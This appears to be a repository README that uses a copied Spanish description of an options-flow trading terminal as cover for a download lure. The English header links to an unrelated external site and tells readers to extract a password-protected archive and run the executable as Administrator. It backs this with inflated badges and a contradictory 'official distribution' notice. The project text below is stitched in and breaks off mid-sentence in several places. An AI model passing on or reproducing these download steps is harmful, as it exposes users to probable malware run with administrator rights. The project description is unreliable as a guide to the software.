<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Orderflow Terminal

Terminal personal de flujo de opciones en tiempo real + análisis fundamental profundo.
Inspirada en Bullflow, Cheddar Flow y Koyfin.

**Datos 100% reales, coste 0 €.** No hay carpeta `mock/`, ni arrays estáticos, ni fallbacks
sintéticos. Si falta una credencial el gateway no arranca; si una fuente falla, la API devuelve
`503` y la UI pinta un error. Un gráfico vacío es un resultado aceptable. Uno inventado, no.

> ⚠️ **Uso personal.** Los datos de opciones vienen de la API de tu bróker y **no son
> redistribuibles**. El gateway escucha solo en `127.0.0.1` a propósito. Detalles en
## Estructura del proyecto

```text
trades/
├─ docs/
│  ├─ FREE-STACK.md                # El camino gratuito (el que usa este repo)
│  ├─ IBKR-SETUP.md                # Client Portal Gateway paso a paso
│  └─ ARCHITECTURE.md              # Versión de pago: OPRA, ClickHouse, NATS, licencias
│
├─ eslint.config.js                # Flat config: TS + React Hooks
│
├─ packages/contracts/src/         # Tipos + Zod compartidos backend/frontend
│  ├─ flow.ts                      # OSI, FlowTrade, OhlcvBar, protocolo WS
│  ├─ fundamentals.ts              # QuarterlyFinancials, valoración, periodType
│  └─ index.ts
│
├─ apps/gateway/                   # Fastify (REST) + uWebSockets (fan-out)
│  ├─ scripts/
│  │  ├─ schwab-auth.ts            # Login OAuth de Schwab (repetir cada 7 días)
│  │  ├─ ibkr-doctor.ts            # Diagnóstico del Client Portal Gateway
│  │  ├─ sentiment-check.ts        # Qué modelos tiene disponibles tu cuenta
│  │  └─ self-signed.ts            # Certificado efímero para el callback
│  ├─ vitest.config.ts             # Entorno ficticio: config.ts valida al importarse
│  └─ src/
│     ├─ server.ts                 # Bootstrap, guardia de auth, health/ready
│     ├─ config.ts                 # Validación estricta del entorno (Zod)
│     ├─ lib/
│     │  ├─ logger.ts              # Pino con redacción de credenciales
│     │  ├─ cache.ts               # CacheStore en memoria + SWR + single-flight
│     │  ├─ time.ts                # Marcas sin zona: CBOE mezcla UTC y ET
│     │  └─ event-bus.ts           # Bus en proceso (sustituye a NATS)
│     ├─ ingest/                   # ─── PILAR 1 ───
│     │  ├─ providers/
│     │  │  ├─ types.ts            # Interfaz común + capabilities
│     │  │  ├─ cboe.provider.ts    # Por defecto: sin cuenta, diferido ~15 min
│     │  │  ├─ schwab.provider.ts  # OAuth2 + streamer LEVELONE_OPTIONS
│     │  │  ├─ ibkr.provider.ts    # Client Portal Web API + tickle
│     │  │  ├─ cached-price-history.ts # Cache compartida de series diarias
│     │  │  └─ index.ts            # Factory por configuración
│     │  ├─ resilient-socket.ts    # Backoff, watchdog de zombies, re-suscripción
│     │  ├─ unusual-activity.ts    # Actividad inferida de cotizaciones
│     │  ├─ classifier.ts          # Sweep/block real (latente: exige tape OPRA)
│     │  ├─ bar-aggregator.ts      # OHLCV desde cotizaciones, 3 vistas
│     │  ├─ net-premium.ts         # Prima neta de calls y puts de la sesión
│     │  └─ options-feed.service.ts# Multiplexor agnóstico del proveedor
│     ├─ realtime/
│     │  └─ hub.ts                 # Fan-out a navegadores con backpressure
│     ├─ services/
│     │  ├─ edgar/                 # ─── PILAR 3 ───
│     │  │  ├─ client.ts           # CIK, companyfacts, filings. Rate limit 10/s
│     │  │  ├─ tags.ts             # Mapeo de conceptos a tags US-GAAP
│     │  │  └─ normalize.ts        # Q4 residual + diffs de acumulados YTD
│     │  ├─ fundamentals.service.ts
│     │  ├─ technicals.ts          # RSI de Wilder, ATR, Bollinger, pivotes
│     │  ├─ market-regime.service.ts   # [Módulo B] score compuesto
│     │  ├─ market-context.service.ts  # Dark pool (FINRA) + calendario
│     │  ├─ movers.service.ts          # Mapa sectorial y destacados
│     │  ├─ gex.service.ts             # Exposición gamma y nivel de gamma cero
│     │  ├─ earnings-reaction.service.ts # Reacción histórica a resultados
│     │  ├─ price-target.service.ts    # Rangos por IV + estado técnico
│     │  ├─ valuation.service.ts       # [Módulo C] DCF + múltiplos
│     │  ├─ news.service.ts            # [Módulo D] catalizadores de la SEC
│     │  └─ sentiment.service.ts       # [Módulo D] heurística / Gemini / Groq / Claude
│     └─ routes/
│        ├─ auth.route.ts          # Login + guardia global de la API
│        ├─ fundamentals.route.ts
│        └─ market.route.ts        # Cadena, GEX, velas, objetivos, noticias
│
└─ apps/web/                       # Next.js 15 + React 19
   └─ src/
      ├─ app/
      │  ├─ page.tsx               # Las cuatro pestañas
      │  ├─ providers.tsx          # QueryClient con reintento selectivo
      │  └─ error.tsx              # Límite de errores con el error de verdad
      ├─ components/
      │  ├─ LoginGate.tsx
      │  ├─ flow/
      │  │  ├─ ContractChart.tsx   # ─── PILAR 2 ─── canvas + TRADE ENTRY + PEAK
      │  │  ├─ ContractHeader.tsx  # Bid/Mid/Ask/Vol/OI y selectores
      │  │  ├─ FlowTape.tsx        # Cinta virtualizada
      │  │  ├─ OptionChain.tsx     # Cadena navegable
      │  │  └─ NetPremiumChart.tsx
      │  ├─ fundamentals/
      │  │  ├─ QuarterlyTable.tsx  # ─── PILAR 3 ─── tabla de Qs
      │  │  ├─ ValuationPanel.tsx
      │  │  └─ EarningsSimulator.tsx
      │  ├─ market/                # [Módulo B] Régimen, Movers, GEX, Contexto
      │  ├─ analysis/
      │  │  └─ PriceTargetPanel.tsx
      │  └─ news/
      │     └─ NewsFeed.tsx        # [Módulo D]
      ├─ hooks/
      │  └─ useTerminalSocket.ts   # Stores fuera de React, coalescing por frame
      └─ lib/
         └─ api.ts                 # Cliente HTTP: token, errores, tipos
```

> Los tests viven junto al código que prueban (`*.test.ts`). `pnpm check` ejecuta
> typecheck, lint y las tres suites de una vez.

---

## Puesta en marcha

Requisitos: Node 22 y pnpm 9.

```bash
pnpm install
cp .env.example .env  # pon APP_PASSWORD (mínimo 8 caracteres) y un JWT_SECRET largo
pnpm dev              # gateway :4000 / :4001, web :3000
```

En Windows también vale `ARRANCAR.bat`: comprueba el `.env` y arranca todo.

- **Opciones sin cuenta:** `OPTIONS_PROVIDER=cboe` lee la cadena completa del CDN público de
  CBOE, con unos 15 minutos de retraso. Para tiempo real, `ibkr` (ver
## Los tres pilares

### Pilar 1. Ingesta y distribución

`apps/gateway/src/ingest/` + `realtime/hub.ts`

El servicio es agnóstico del proveedor: habla contra una interfaz que declara sus
`capabilities`, así que funciona igual con un bróker gratuito que con un feed OPRA de pago.
Lo que cambia entre ambos, el proveedor lo declara y el servicio se adapta en vez de asumir.

Cuatro decisiones que son la diferencia entre aguantar un día de vencimiento o caerse:

- **Watchdog de inactividad.** Lo que mata las implementaciones ingenuas no es la desconexión
  limpia, es el socket que sigue `OPEN` y dejó de recibir. En IBKR además hay que llamar a
  `/tickle` cada 45 s o la sesión muere sin cerrar el WebSocket.
- **Deltas, no snapshots.** Schwab e IBKR envían solo los campos que cambiaron. Tratar cada
  mensaje como estado completo produce huecos constantes en bid/ask.
- **La primera cotización solo siembra la línea base.** Tratar el volumen acumulado de sesión
  como una operación nueva generaría una señal enorme y falsa en cada arranque.
- **Backpressure con jerarquía.** Bajo congestión se descartan las *quotes* (recuperables) y
  se conservan los *trades* (no lo son).

### Pilar 2. Gráfico de contrato

`apps/web/src/components/flow/ContractChart.tsx`

Canvas vía lightweight-charts v5, con marcadores `TRADE ENTRY`, tag `~X% PEAK` con línea
discontinua y sub-pane de volumen por lado agresor.

Lo que lo mantiene a 60 fps: las series viven en refs, **nunca** en estado de React, y los
ticks se agrupan por frame con `requestAnimationFrame`. El efecto que crea el gráfico depende
solo de cosas estructurales: si dependiera de `bars`, cada dato nuevo recrearía el canvas,
que es el bug de rendimiento clásico con esta librería.

### Pilar 3. Fundamentales sobre SEC EDGAR

`apps/gateway/src/services/edgar/` + `apps/web/src/components/fundamentals/QuarterlyTable.tsx`

EDGAR es la fuente de la que derivan FMP e Intrinio: leyéndola directamente no se pierde
información, solo normalización. Las tres trampas están resueltas en
